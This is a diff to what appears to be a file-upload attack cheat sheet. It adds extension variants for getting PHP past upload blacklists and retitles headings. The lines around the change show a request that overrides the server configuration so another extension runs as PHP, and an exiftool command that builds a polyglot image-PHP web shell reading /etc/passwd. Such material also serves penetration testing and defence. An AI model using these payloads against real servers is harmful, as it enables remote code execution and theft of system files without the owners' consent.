@@ -53,7 +53,7 @@ Content-Type: application/x-php
 
 <br />
 
-## File extensions for bypass blacklist
+## File Extension Bypass
 
 ```
 exploit.php
@@ -70,11 +70,13 @@ exploit.php%00.jpg
 exploit.php%0d%0a.jpg
 exploit.pHp
 exploit.gif.pHp
+exploit.jpg.php
+exploit.png.php
 ```
 
 <br />
 
-## Override the server configuration
+## Override Server Configuration
 
 ```php
 POST /upload HTTP/1.1
@@ -91,7 +93,7 @@ AddType application/x-httpd-php .abc
 
 <br />
 
-## Polyglot web shell (using exiftool)
+## Polyglot Web Shell (using exiftool)
 
 ```sh
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
